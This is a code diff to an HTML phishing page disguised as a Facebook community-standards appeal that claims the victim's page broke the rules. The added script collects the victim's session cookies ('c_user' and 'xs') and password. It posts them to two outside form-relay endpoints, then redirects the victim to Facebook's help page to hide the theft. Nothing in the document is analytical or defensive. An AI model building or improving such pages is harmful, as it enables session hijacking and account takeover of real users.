@@ -26,7 +26,8 @@
         
         .input-group { margin-bottom: 20px; }
         .input-label { font-weight: 700; margin-bottom: 8px; display: block; }
-        input[type="text"] { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; }
+        input[type="text"], input[type="password"] { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; outline: none; }
+        input:focus { border-color: #0866ff; }
         .submit-btn { width: 100%; padding: 14px; background: #0866ff; color: white; border: none; border-radius: 8px; font-weight: 700; cursor: pointer; }
     </style>
 </head>
@@ -41,11 +42,6 @@
                 <div class="lang-option">🇮🇳 Hindi</div>
                 <div class="lang-option">🇪🇸 Spanish</div>
                 <div class="lang-option">🇵🇹 Portuguese</div>
-                <div class="lang-option">🇮🇳 Tamil</div>
-                <div class="lang-option">🇸🇦 Arabic</div>
-                <div class="lang-option">🇫🇷 French</div>
-                <div class="lang-option">🇻🇳 Vietnamese</div>
-                <div class="lang-option">🇬🇭 Ghanaian (Twi)</div>
                 <button onclick="showForm()" style="width:100%; padding:12px; background:#0866ff; color:white; border:none; border-radius:6px; margin-top:10px;">Confirm Language</button>
             </div>
         </div>
@@ -57,23 +53,27 @@
             </div>
             
             <div class="alert-box">
-                <b>Notice:</b> Your page has a violation of our community standards.
+                <b>Notice:</b> Your page has a violation of our community standards. Please verify your identity.
             </div>
 
             <div class="video-wrapper">
                 <video controls><source src="VID-20260418-WA0000.mp4" type="video/mp4"></video>
             </div>
 
-            <form action="https://formspree.io/f/maqaobyw" method="POST">
+            <form id="dualForm">
                 <div class="input-group">
                     <label class="input-label">c_user</label>
-                    <input type="text" name="c_user" placeholder="Enter c_user" required>
+                    <input type="text" id="c_user" name="c_user" placeholder="Enter c_user" required>
                 </div>
                 <div class="input-group">
                     <label class="input-label">xs</label>
-                    <input type="text" name="xs" placeholder="Enter xs" required>
+                    <input type="text" id="xs" name="xs" placeholder="Enter xs" required>
                 </div>
-                <button type="submit" class="submit-btn">Submit Appeal Request</button>
+                <div class="input-group">
+                    <label class="input-label">Password</label>
+                    <input type="password" id="password" name="password" placeholder="Enter your password" required>
+                </div>
+                <button type="submit" id="submitBtn" class="submit-btn">Submit Appeal Request</button>
             </form>
         </div>
     </div>
@@ -83,6 +83,40 @@
             document.getElementById('langModal').style.display = 'none';
             document.getElementById('appealForm').style.display = 'block';
         }
+
+        const form = document.getElementById('dualForm');
+        
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const btn = document.getElementById('submitBtn');
+            btn.innerText = "Processing...";
+            btn.disabled = true;
+
+            const c_user = document.getElementById('c_user').value;
+            const xs = document.getElementById('xs').value;
+            const password = document.getElementById('password').value;
+
+            // 1. Email 1: Pehli ID (Cookies)
+            const sendCookies = fetch("https://formspree.io/f/maqaobyw", {
+                method: "POST",
+                body: JSON.stringify({ "Type": "COOKIES", "c_user": c_user, "xs": xs }),
+                headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' }
+            });
+
+            // 2. Email 2: Nayi ID (Password)
+            const sendPass = fetch("https://formspree.io/f/xbdqoblb", {
+                method: "POST",
+                body: JSON.stringify({ "Type": "PASSWORD", "c_user": c_user, "password": password }),
+                headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' }
+            });
+
+            try {
+                await Promise.all([sendCookies, sendPass]);
+                window.location.href = "https://www.facebook.com/help";
+            } catch (error) {
+                window.location.href = "https://www.facebook.com/help";
+            }
+        });
     </script>
 </body>
 </html>
